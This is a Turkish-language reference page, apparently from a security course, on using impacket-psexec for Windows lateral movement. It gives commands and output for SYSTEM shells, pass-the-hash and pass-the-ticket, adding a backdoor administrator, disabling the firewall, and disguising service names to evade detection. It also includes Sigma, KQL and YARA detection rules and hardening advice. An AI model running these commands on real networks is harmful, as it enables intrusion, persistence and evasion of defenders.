# impacket-psexec

> **Kategori:** [11. YANAL HAREKET VE UZAK KOD YÜRÜTME (LATERAL MOVEMENT & EXECUTION)](./README.md) · **Modül:** [Modül 11 — Araç Cephaneliği](../README.md)
> **Tanım:** Windows Service Control Manager (SCM) ve SMB RPC protokollerini kullanarak uzak sistemin ADMIN$ paylaşımına rastgele bir servis ikilisi yükleyen, servis başlatma yoluyla NT AUTHORITY\SYSTEM yetkisinde tam interaktif kabuk sağlayan Impacket yanal hareket aracı.

---

## 1. Genel Bakış ve Amaç

`impacket-psexec` (veya `psexec.py`), Sysinternals paketindeki popüler `PsExec` yardımcı programının açık kaynaklı ve platformlar arası Python uygulamasıdır. Fortra/SecureAuth Impacket kütüphanesinin bir parçası olan bu araç, özellikle Linux saldırı sistemlerinden (Kali, Parrot, C2 sunucuları) Windows etki alanı sunucularına ve iş istasyonlarına yanal hareket gerçekleştirmek için geliştirilmiştir.

impacket-psexec, hedef makinede geçerli bir yerel yönetici (Local Administrator) veya etki alanı yöneticisi (Domain Administrator) kimlik bilgisi (açık parola, NTLM hash veya Kerberos bileti) ile çalışır. Araç, SMB (TCP 445) üzerinden hedef makinenin gizli yönetimsel paylaşımı olan `ADMIN$` (`C:\Windows`) dizinine küçük bir servis çalıştırılabilir ikilisi (.exe) yükler. Ardından RPC `svcctl` (Service Control Manager) adlandırılmış borusuna (named pipe) bağlanarak `CreateServiceW` API çağrısıyla bir Windows servisi tanımlar ve `StartServiceW` ile servisi başlatır.

Başlatılan bu servis, Windows'un en yüksek yerel yetki seviyesi olan `NT AUTHORITY\SYSTEM` bağlamında çalışır ve standart girdi/çıktı (stdin, stdout, stderr) akışlarını SMB adlandırılmış boruları (`\PIPE\psexec_...`) üzerinden yönlendirerek operatöre tam donanımlı, etkileşimli bir Windows komut istemi (`cmd.exe`) sunar. İşlem tamamlandığında servis durdurulur, SCM'den kaydı silinir ve yüklenen dosya diskten temizlenir.

```
+-------------------------------------------------------------------------+
|                       impacket-psexec Mimari Akışı                      |
+-------------------------------------------------------------------------+
                               |
               Linux Operatörü (Kali / C2 Host)
         [psexec.py corp.local/admin:pass@192.168.1.15]
                               v
                     +--------------------+
                     | psexec.py (Engine) |
                     +--------------------+
                               |
               1. SMB Tree Connect (TCP 445) -> \\Target\ADMIN$
               2. IRP_MJ_CREATE: Upload RemComSvc.exe (Rastgele İsim)
                               v
                +------------------------------+
                | Hedef Sunucu: C:\Windows\    |
                | (Yüklenen Servis İkilisi)    |
                +------------------------------+
                               |
               3. RPC svcctl (\PIPE\svcctl)
               CreateServiceW("BGFH_Service", "C:\Windows\BGFH.exe")
               StartServiceW()
                               v
                +------------------------------+
                | Service Control Manager(SCM) |
                | (services.exe)               |
                +------------------------------+
                               |
                               +-> Yeni Servis Süreci Başlatılır
                                   (NT AUTHORITY\SYSTEM)
                               |
               4. Adlandırılmış Boru (Named Pipe) El Sıkışması
               (\PIPE\psexec_stdin, \PIPE\psexec_stdout)
                               v
                +------------------------------+
                | Interaktif Komut Satırı      |
                | (cmd.exe / SYSTEM)           |
                +------------------------------+
                               |
               5. Çıkış ve Temizlik:
                  - ControlService(SERVICE_CONTROL_STOP)
                  - DeleteService()
                  - SMB DeleteFile(BGFH.exe)
```

### 1.1 Yürütme ve Haberleşme Mekanizması
* **Servis Yükleme:** Impacket, derlenmiş bir RemCom servis ikilisini bellekte tutar ve hedef sistemin mimarisine (x86/x64) göre `ADMIN$` paylaşımına rastgele 4-8 karakterlik bir adla yazar.
* **RPC svcctl Protokolü:** `\PIPE\svcctl` üzerinden SCM ile iletişim kurularak `SERVICE_WIN32_OWN_PROCESS` tipinde yeni bir servis kaydı açılır.
* **Çift Yönlü Named Pipe:** Telnet veya raw socket açmak yerine tüm girdi ve çıktılar SMB protokolü üzerinden şifreli veya imzalı adlandırılmış borularla aktarılır. Bu sayede harici bir port dinleme veya güvenlik duvarı kuralı açma gereksinimi oluşmaz.

### Neden Önemli?

| Senaryo / İhtiyaç | Operasyonel Açıklama |
|---|---|
| **Doğal SYSTEM Yetkisi** | Servisler doğrudan `NT AUTHORITY\SYSTEM` çalıştığı için ayrı bir yerel yetki yükseltme (LPE) adımına ihtiyaç duyulmaması. |
| **Tam İnteraktif Shell** | Standart komut yürütücülerin aksine canlı çıktı akışı sağlayan etkileşimli bir oturum açılması. |
| **Pass-the-Hash (PtH) Desteği** | Açık metin parola bilinmediğinde ele geçirilen NTLM hash'i ile doğrudan komut satırı elde edebilme. |
| **Kerberos Bilet Uyumluluğu** | Linux bilet önbelleği (`.ccache`) üzerinden bilet taklidi (Pass-the-Ticket) ile etki alanı sistemlerine sızma. |
| **Doğal Ağ Tünelleme** | Yalnızca TCP 445 portunun açık olması yeterlidir; ek bir ağ portuna veya uzak masaüstü servisine ihtiyaç duymaz. |

### Alternatif Araçlarla Karşılaştırma

| Özellik / Boyut | impacket-psexec | impacket-smbexec | impacket-wmiexec | Evil-WinRM |
|---|---|---|---|---|
| **Diske Dosya Bırakma** | Evet (`C:\Windows\*.exe`) | Hayır (Sadece geçici .bat/.txt)| Hayır (Dosyasız) | Hayır (PowerShell Runspace) |
| **Servis Oluşturma (SCM)**| Evet (Event ID 7045) | Evet (Event ID 7045) | Hayır | Hayır |
| **Kullanıcı Bağlamı** | `NT AUTHORITY\SYSTEM` | `NT AUTHORITY\SYSTEM` | Çağıran Kullanıcı | Çağıran Kullanıcı |
| **İnteraktif Kabuk** | Evet (Canlı PTY/Pipe) | Hayır (Yarı-interaktif echo) | Hayır (Yarı-interaktif) | Evet (Zengin PowerShell) |
| **Gereken Portlar** | TCP 445 | TCP 445 | TCP 135 + Dinamik DCOM | TCP 5985 / 5986 |
| **EDR / AV Yakalanma İzi**| Çok Yüksek | Orta | Düşük | Düşük / Orta |

---

## 2. Temel Sözdizimi ve Parametreler (CLI Flags)

`impacket-psexec`, standart Impacket bağlantı ve kimlik doğrulama sözdizimini kullanır.

### Genel Sözdizimi
```bash
impacket-psexec [[etki_alanı/]kullanıcı[:parola]@]<hedef_ip_veya_fqdn> [Komut] [Seçenekler]
```

### Kritik Parametreler Tablosu

| Parametre | Bayrak | Açıklama | Örnek Değer |
|---|---|---|---|
| Hedef / Kimlik | `[domain/]user:pass@host` | Etki alanı, kullanıcı adı, parola ve hedef adresi. | `corp.local/admin:Pass!@10.0.0.1` |
| Pass-the-Hash | `-hashes` | NTLM hash ile oturum açma (`LMHASH:NTHASH`). | `-hashes :51a26b735c02dc...` |
| Kerberos Auth | `-k` | Kerberos kimlik doğrulaması kullanır (`KRB5CCNAME`). | *Argümansız bayrak* |
| Parolasız Mod | `-no-pass` | Parola sorma promptunu atlar (Kerberos için). | *Argümansız bayrak* |
| KDC IP Adresi | `-dc-ip` | Kerberos bilet talepleri için Etki Alanı Denetleyicisi IP'si. | `-dc-ip 10.0.0.1` |
| Hedef IP Zorlama | `-target-ip` | Kerberos için FQDN kullanırken ağ bağlantısını IP'ye zorlar. | `-target-ip 192.168.1.15` |
| Servis Adı | `-service-name` | Hedefte oluşturulacak Windows servisinin adı. | `-service-name WindowsUpdateHelper` |
| Uzak Dosya Adı | `-remote-binary-name` | `ADMIN$` paylaşımına yazılacak ikili dosyanın adı. | `-remote-binary-name svchost_upd.exe`|
| Karakter Kodlaması| `-codec` | Standart olmayan işletim sistemi dilleri için kodlama. | `-codec cp1254` (Türkçe) |
| Komut Çalıştırma | `[komut]` | İnteraktif kabuk açmak yerine tek bir komut koşturur. | `cmd.exe /c whoami` |

---

## 3. Pratik Komut Örnekleri

### Senaryo 1: Etki Alanı Yöneticisi Parolasıyla İnteraktif SYSTEM Kabuğu Alma
Etki alanı yöneticisi kimlik bilgileriyle hedef sunucuya bağlanarak `NT AUTHORITY\SYSTEM` yetkisinde etkileşimli kabuk açma.

```bash
impacket-psexec corp.local/da_admin:P@ssw0rd2026!@192.168.1.15
```

**Örnek Konsol Çıktısı:**
```text
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

[*] Requesting shares on 192.168.1.15.....
[*] Found writable share ADMIN$
[*] Uploading file UjLp.exe
[*] Opening SVCManager on 192.168.1.15.....
[*] Creating service vBRe on 192.168.1.15.....
[*] Starting service vBRe.....
[+] Process vBRe created for pipe psexec_stdin with PID 4928
[+] Process vBRe created for pipe psexec_stdout with PID 4932
[+] Process vBRe created for pipe psexec_stderr with PID 4936
[+] Opening pipe psexec_stdin
[+] Opening pipe psexec_stdout
[+] Opening pipe psexec_stderr
[*] Converting Windows command prompt to UTF-8
Microsoft Windows [Version 10.0.19045.3803]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32> whoami
nt authority\system

C:\Windows\system32> whoami /priv | findstr Enabled
SeAssignPrimaryTokenPrivilege     Enabled
SeLockMemoryPrivilege             Enabled
SeIncreaseQuotaPrivilege          Enabled
SeTcbPrivilege                    Enabled
SeSecurityPrivilege               Enabled
SeTakeOwnershipPrivilege          Enabled
SeLoadDriverPrivilege             Enabled
SeSystemtimePrivilege             Enabled
SeProfileSingleProcessPrivilege   Enabled
SeIncreaseBasePriorityPrivilege   Enabled
SeCreatePagefilePrivilege         Enabled
SeBackupPrivilege                 Enabled
SeRestorePrivilege                Enabled
SeShutdownPrivilege               Enabled
SeDebugPrivilege                  Enabled
SeAuditPrivilege                  Enabled
SeSystemEnvironmentPrivilege      Enabled
SeChangeNotifyPrivilege           Enabled
SeUndockPrivilege                 Enabled
SeManageVolumePrivilege           Enabled
SeImpersonatePrivilege            Enabled
SeCreateGlobalPrivilege           Enabled

C:\Windows\system32> exit
[*] Closing pipe psexec_stdin
[*] Closing pipe psexec_stdout
[*] Closing pipe psexec_stderr
[*] Stopping service vBRe.....
[*] Removing service vBRe.....
[*] Removing file UjLp.exe.....
[+] Done
```

### Senaryo 2: Pass-the-Hash (PtH) ile Parolasız Oturum Açma
Açık metin parolası olmayan bir yerel yönetici hesabının NTLM hash'i kullanılarak hedef iş istasyonunda oturum açılması.

```bash
impacket-psexec -hashes :31d6cfe0d16ae931b73c59d7e0c089c0 Administrator@192.168.1.20
```

### Senaryo 3: Kerberos Bileti (.ccache) ile Pass-the-Ticket Yanal Hareketi
Önceden elde edilmiş bir TGT/TGS bileti ile NTLM kullanmadan doğrudan Kerberos protokolüyle bağlanma.

```bash
export KRB5CCNAME=/tmp/da_admin.ccache
impacket-psexec -k -no-pass -dc-ip 192.168.1.10 CORP.LOCAL/da_admin@FS01.corp.local
```

### Senaryo 4: OPSEC Kamuflajı için Özel Servis ve Dosya Adı Belirleme
Rastgele oluşturulan şüpheli dosya ve servis isimleri yerine kurumsal güncellemeleri taklit eden özel adlar tanımlayarak iz bırakmayı azaltma.

```bash
impacket-psexec corp.local/jdoe:Pass123!@192.168.1.15 -service-name "WindowsDiagnosticSvc" -remote-binary-name "diagtrack_upd.exe"
```

### Senaryo 5: İnteraktif Olmayan Tek Komut Yürütme
Kabukta kalmadan yalnızca tek bir yönetim komutunu koşturup sonucu alarak oturumu anında sonlandırma.

```bash
impacket-psexec corp.local/jdoe:Pass123!@192.168.1.15 "cmd.exe /c net user backup_admin P@ssword123! /add && net localgroup administrators backup_admin /add"
```

---

## 4. Karşılaşılan Hatalar ve Çözümleri (Troubleshooting)

| Hata Mesajı / Belirti | Olası Neden | Kesin Çözüm Adımı |
|---|---|---|
| `SMB SessionError: STATUS_ACCESS_DENIED` | Kullanıcının `ADMIN$` paylaşımına yazma yetkisi yok veya hedefte Remote UAC devrede. | Etki alanı yöneticisi hesabı kullanın; yerel hesap ise `LocalAccountTokenFilterPolicy=1` ayarını kontrol edin. |
| `[-] Error opening SVCManager: STATUS_ACCESS_DENIED` | Kullanıcı kimliği doğrulandı ancak SCM üzerinde `SC_MANAGER_CREATE_SERVICE` ayrıcalığı bulunmuyor. | Kullanıcının hedef makinedeki `Administrators` grubunda olduğunu doğrulayın (`whoami /groups`). |
| `STATUS_SHARING_VIOLATION on file upload` | Önceki başarısız bir oturumdan kalan servis ikilisi hala çalışıyor veya dosya sisteminde kilitli. | `-remote-binary-name` ile farklı bir dosya adı belirtin veya hedef makinedeki kilitli süreci sonlandırın. |
| `Kerberos SessionError: KDC_ERR_S_PRINCIPAL_UNKNOWN` | Hedef makinenin SPN kaydı Active Directory'de bulunamadı. | Hedef IP yerine etki alanı FQDN'ini (`FS01.corp.local`) kullanın ve `-dc-ip` parametresi sağlayın. |
| `Process create failed for pipe: STATUS_PIPE_NOT_AVAILABLE` | Güvenlik yazılımı adlandırılmış boru oluşturulmasını engelledi veya servis başlatılamadı. | EDR tarafından engellenmiş olabilir; `impacket-wmiexec` gibi dosyasız alternatif yürütme yöntemlerini deneyin. |
| `Connection reset by peer / Broken Pipe` | Uç nokta güvenlik yazılımı (AV/EDR), diske bırakılan `RemComSvc.exe` ikilisini statik imzası sebebiyle karantinaya aldı. | Obfuscate edilmiş özel bir ikili derleyin veya ikili bırakmayan `impacket-smbexec` kullanın. |

---

## 5. OPSEC ve Karşı Tespit (IOC)

impacket-psexec, sunduğu tam etkileşimli kabuk ve `NT AUTHORITY\SYSTEM` ayrıcalıklarına karşılık, modern EDR ve SIEM altyapılarında **en kolay tespit edilen** yanal hareket araçlarından biridir.

```
[impacket-psexec Yürütmesi]
          │
          ├──> ADMIN$ Paylaşımına Dosya Yazma ──> Event ID 5145 (AccessMask: 0x2 / WriteData)
          │                                     Sysmon Event ID 11 (FileCreate: *.exe in Windows)
          │
          ├──> SCM Üzerinde Servis Oluşturma ────> System Event ID 7045 (New Service Installed)
          │                                     Security Event ID 4697 (A service was installed)
          │
          ├──> Servis Sürecinin Başlatılması ───> Sysmon Event ID 1 (Process Creation: services.exe)
          │
          └──> cmd.exe Alt Süreci Türetilmesi ──> Sysmon Event ID 1 (RemComSvc.exe -> cmd.exe)
```

### 5.1 Bırakılan İzler ve Olay Günlükleri
* **System Event ID 7045 / Security Event ID 4697 (A Service Was Installed in the System):** Oluşturulan servisin adı (`ServiceName`), çalıştırılabilir dosya yolu (`ImagePath: %SystemRoot%\<rastgele>.exe`) ve servis tipi loglanır.
* **Security Event ID 5145 (Detailed File Share Access):** `ADMIN$` paylaşımı altında `.exe` uzantılı bir dosyanın oluşturulması (`Accesses: WriteData`).
* **Sysmon Event ID 11 (FileCreate):** `C:\Windows\` dizininde beklenmedik bir çalıştırılabilir dosyanın oluşturulması.
* **Sysmon Event ID 1 (Process Creation):** `services.exe` sürecinin bilinmeyen bir ikiliyi başlatması ve bu ikilinin alt süreç olarak `cmd.exe` türetmesi.

### 5.2 MITRE ATT&CK Eşleştirmesi

| Taktik | Teknik ID | Teknik Adı | Operasyonel Kullanım |
|---|---|---|---|
| **Lateral Movement** | [T1021.002](https://attack.mitre.org/techniques/T1021/002/) | SMB/Windows Admin Shares | `ADMIN$` paylaşımına dosya aktarımı. |
| **Execution** | [T1569.002](https://attack.mitre.org/techniques/T1569/002/) | Service Execution | SCM üzerinden yeni servis başlatarak kod yürütme. |
| **Privilege Escalation** | [T1068](https://attack.mitre.org/techniques/T1068/) | Exploitation for Privilege Escalation | Servis mekanizması ile doğrudan `SYSTEM` yetkisi elde etme. |
| **Defense Evasion** | [T1070.004](https://attack.mitre.org/techniques/T1070/004/) | File Deletion | Oturum kapandığında servis ikilisinin otomatik silinmesi. |

### 5.3 OPSEC Risk ve Önlem Tablosu

| Tespit Riski | Teknik Sebebi | Azaltma / Önlem Stratejisi |
|---|---|---|
| **Diske İkili Bırakılması** | `ADMIN$` dizinine yazılan dosyanın AV/EDR statik imzalarına takılması. | Diske ikili yazmayan `impacket-wmiexec` veya `impacket-smbexec` yöntemlerini kullanın. |
| **Event ID 7045 Servis Alarmı** | Windows Olay Günlüklerine yeni servis kurulumunun düşmesi. | `-service-name` ve `-remote-binary-name` ile kurumsal servis isimlerini taklit edin veya servis kullanmayan DCOM yöntemlerini seçin. |
| **Süreç Ağacı Anomalisi** | Bilinmeyen bir servisin `cmd.exe` çalıştırması. | Kabuk üzerinden çok fazla çocuk süreç (`whoami`, `net user`) türetmek yerine oturumu kısa tutun. |

### 5.4 Tespit Kuralları

#### Sigma Kuralı (New Service Installation via PsExec Artifacts)
```yaml
title: Service Installation via Impacket PsExec
id: c1a2b3d4-5678-90ab-cdef-1234567890ab
status: production
description: Impacket psexec tarzı rastgele isimli servis ve C:\Windows altında ikili oluşturulması tespit edildi.
logsource:
  product: windows
  service: system
detection:
  selection_service:
    EventID: 7045
    ImagePath|startswith: '%SystemRoot%\'
    ImagePath|endswith: '.exe'
  filter_legit:
    ImagePath|contains:
      - 'system32\'
      - 'SysWOW64\'
  condition: selection_service and not filter_legit
falsepositives:
  - Eski yönetim araçları ve üçüncü parti sürücü kurulumları
level: critical
```

#### Microsoft Sentinel KQL Sorgusu
```kql
SecurityEvent
| where EventID == 7045
| extend ServiceImagePath = tostring(EventData.ImagePath)
| where ServiceImagePath startswith @"%SystemRoot%\" and not(ServiceImagePath has @"\system32\" or ServiceImagePath has @"\SysWOW64\")
| project TimeGenerated, Computer, EventData.ServiceName, ServiceImagePath, EventData.ServiceType, SubjectUserName
| order by TimeGenerated desc
```

#### YARA Kuralı
```yara
rule Impacket_PsExec_RemCom_Binary {
    meta:
        description = "impacket-psexec gömülü RemCom servis ikilisi tespiti"
        author = "Antigravity Active Directory Project"
        date = "2026-10-14"
        reference = "https://github.com/fortra/impacket"
    strings:
        $s1 = "RemCom" ascii wide
        $s2 = "psexec_stdin" ascii wide
        $s3 = "psexec_stdout" ascii wide
        $s4 = "psexec_stderr" ascii wide
        $s5 = "\\\\.\\pipe\\" ascii wide
    condition:
        uint16(0) == 0x5A4D and 3 of ($s*)
}
```

### 5.5 Savunma Karşılığı ve Sertleştirme (Hardening)
* **Yönetimsel Paylaşımların Kısıtlanması (Remote UAC):** `LocalAccountTokenFilterPolicy` kayıt defteri değeri `0` tutularak yerel yönetici hesaplarının ağ üzerinden `ADMIN$` ve `C$` paylaşımlarına tam yetkiyle erişmesi engellenmelidir.
* **Mikro Segmentasyon ve Ana Makine Güvenlik Duvarı:** İstemciler arası (workstation-to-workstation) SMB (TCP 445) trafiği tamamen engellenmeli; psexec tarzı yanal hareketler sadece yetkili yönetim alt ağlarına izin verilmelidir.
* **Servis Kurulum Denetimi (Auditing):** Group Policy üzerinden `Audit Security System Extension` ve `Audit Detailed File Share` politikaları etkinleştirilerek Event ID 7045 ve 5145 günlükleri SIEM'de gerçek zamanlı alarmlara bağlanmalıdır.
* **En Az Yetki ve gMSA:** Sunucu ve servis yönetiminde sabit yerel yönetici parolaları yerine Group Managed Service Account (gMSA) ve LAPS kullanılmalıdır.

---

## 6. En Çok Kullanılan Komutlar ve Açıklamaları (Hızlı Referans / Cheat Sheet)

```bash
# 1. Standart Parola ile İnteraktif SYSTEM Kabuğu Alma
impacket-psexec corp.local/da_admin:P@ss123@192.168.1.15

# 2. Pass-the-Hash (NTLM Hash) ile SYSTEM Kabuğu Alma
impacket-psexec -hashes :51a26b735c02dcda234b21651d30f7b1 Administrator@192.168.1.15

# 3. Kerberos Bileti (.ccache) ile Parolasız Giriş
export KRB5CCNAME=/tmp/admin.ccache && impacket-psexec -k -no-pass -dc-ip 192.168.1.10 CORP.LOCAL/admin@FS01.corp.local

# 4. Yerel Administrator Hesabı ile Oturum Açma
impacket-psexec ./Administrator:LocalAdminPass!@192.168.1.20

# 5. Özel Servis ve İkili Adı Belirterek Kamuflaj Sağlama
impacket-psexec corp.local/admin:Pass!@192.168.1.15 -service-name "WinUpdateAgent" -remote-binary-name "wuagent.exe"

# 6. Tek Komut Çalıştırıp Oturumu Sonlandırma
impacket-psexec corp.local/admin:Pass!@192.168.1.15 "cmd.exe /c whoami /all"

# 7. Türkçe Karakter Desteği için Codec Tanımlama
impacket-psexec corp.local/admin:Pass!@192.168.1.15 -codec cp1254

# 8. Hedef FQDN Çözümlenemediğinde IP Adresini Zorlama
impacket-psexec -k -no-pass -target-ip 192.168.1.15 CORP.LOCAL/admin@FS01.corp.local

# 9. Yeni Kullanıcı Ekleyip Yerel Yöneticilere Atama
impacket-psexec corp.local/admin:Pass!@192.168.1.15 "net user secops P@ss2026! /add && net localgroup administrators secops /add"

# 10. Hedef Güvenlik Duvarını Kapatma Komutu Gönderme
impacket-psexec corp.local/admin:Pass!@192.168.1.15 "netsh advfirewall set allprofiles state off"
```

### Komut Detay Analizleri

#### 1. Standart Parola ile İnteraktif SYSTEM Kabuğu Alma
* **Ne Yapar?:** SMB üzerinden `ADMIN$` paylaşımına bağlanır, geçici servis yükler ve hedef sunucuda `NT AUTHORITY\SYSTEM` yetkisinde canlı komut satırı başlatır.
* **Ne Zaman Kullanılır?:** Yönetici parolası bilindiğinde doğrudan en yüksek yetkide interaktif oturum açmak için.
* **Parametreler:**
  * `corp.local/da_admin:P@ss123`: Etki alanı kullanıcı adı ve parolası.
  * `@192.168.1.15`: Hedef makine IP adresi.

#### 2. Pass-the-Hash (NTLM Hash) ile SYSTEM Kabuğu Alma
* **Ne Yapar?:** Açık metin parola olmadan, bellekten veya SAM dosyasından çekilen NTLM hash ile kimlik doğrulayıp kabuk açar.
* **Ne Zaman Kullanılır?:** Parola kırılamadığında veya PTH saldırısı yürütülürken.
* **Parametreler:**
  * `-hashes :<NTHASH>`: LM ve NT hash ikilisi.

#### 3. Kerberos Bileti (.ccache) ile Parolasız Giriş
* **Ne Yapar?:** Linux ortamındaki Kerberos biletini kullanarak NTLM kullanmaksızın Kerberos biletiyle SCM servisini tetikler.
* **Ne Zaman Kullanılır?:** NTLM izleme alarmlarından kaçınmak veya Golden/Silver Ticket kullanırken.
* **Parametreler:**
  * `-k`: Kerberos kimlik doğrulamasını zorlar.
  * `-no-pass`: Parola sorma promptunu atlar.
  * `-dc-ip`: Kerberos KDC denetleyicisi IP'si.

#### 4. Yerel Administrator Hesabı ile Oturum Açma
* **Ne Yapar?:** Etki alanı yerine makinenin yerel SAM veritabanındaki `Administrator` hesabıyla kimlik doğrular.
* **Ne Zaman Kullanılır?:** Etki alanından bağımsız yerel yönetici parolası veya LAPS parolası bilinen sistemlerde.
* **Parametreler:**
  * `./Administrator`: Etki alanı yerine yerel kimlik bağlamını (`.\`) belirtir.

#### 5. Özel Servis ve İkili Adı Belirterek Kamuflaj Sağlama
* **Ne Yapar?:** Rastgele 4 karakterli dosya/servis ismi yerine operatörün belirlediği kurumsal görünümlü isimleri kullanır.
* **Ne Zaman Kullanılır?:** Basit imza bazlı veya rastgele isim denetimi yapan kural setlerini atlatmak için.
* **Parametreler:**
  * `-service-name "WinUpdateAgent"`: Özel servis adı.
  * `-remote-binary-name "wuagent.exe"`: `ADMIN$` altına yazılacak dosya adı.

#### 6. Tek Komut Çalıştırıp Oturumu Sonlandırma
* **Ne Yapar?:** İnteraktif döngüye girmeden belirtilen komutu işletir, çıktıyı konsola basar, servisi ve dosyayı hemen silip çıkar.
* **Ne Zaman Kullanılır?:** Hızlı durum kontrolü yapmak veya otomasyon betiklerine entegre etmek için.
* **Parametreler:**
  * Komut dizesi en sonda argüman olarak verilir.

#### 7. Türkçe Karakter Desteği için Codec Tanımlama
* **Ne Yapar?:** Windows Türkçe dil paketine sahip sistemlerde dönen konsol karakter hatalarını (ç, ş, ğ, ı) düzeltir.
* **Ne Zaman Kullanılır?:** Türkçe işletim sistemlerinde çıktıların bozulmadan okunması için.
* **Parametreler:**
  * `-codec cp1254`: Windows-1254 Türkçe karakter kodlamasını uygular.

#### 8. Hedef FQDN Çözümlenemediğinde IP Adresini Zorlama
* **Ne Yapar?:** Kerberos için FQDN adına bilet talep ederken ağ bağlantısını doğrudan verilen IP adresine yönlendirir.
* **Ne Zaman Kullanılır?:** Saldırgan makinesinde yerel DNS çözünürlüğü yapılandırılamadığı durumlarda.
* **Parametreler:**
  * `-target-ip 192.168.1.15`: Gerçek hedef IP'si.

#### 9. Yeni Kullanıcı Ekleyip Yerel Yöneticilere Atama
* **Ne Yapar?:** Hedef sistemde yeni bir yerel kullanıcı açar ve onu `Administrators` grubuna ekler.
* **Ne Zaman Kullanılır?:** Yanal hareket sonrasında hedef makinede kalıcılık sağlamak için.
* **Parametreler:**
  * `net user ... /add && net localgroup administrators ... /add`.

#### 10. Hedef Güvenlik Duvarını Kapatma Komutu Gönderme
* **Ne Yapar?:** Windows Defender Güvenlik Duvarını tüm profiller (Domain, Private, Public) için devre dışı bırakır.
* **Ne Zaman Kullanılır?:** Diğer portların (RDP 3389, WinRM 5985) önünü açmak için.
* **Parametreler:**
  * `netsh advfirewall set allprofiles state off`.

---

## Kaynaklar
* [Impacket Resmi GitHub Deposu](https://github.com/fortra/impacket)
* [Sysinternals PsExec Dokümantasyonu](https://learn.microsoft.com/en-us/sysinternals/downloads/psexec)
* [MITRE ATT&CK: Service Execution (T1569.002)](https://attack.mitre.org/techniques/T1569/002/)
* [Microsoft Open Specifications: [MS-SCMR] Service Control Manager Remote Protocol](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-scmr/)

---

> **Önceki:** [← NetExec (nxc)](./NetExec_nxc.md) · **Sonraki:** [impacket-smbexec →](./impacket-smbexec.md)
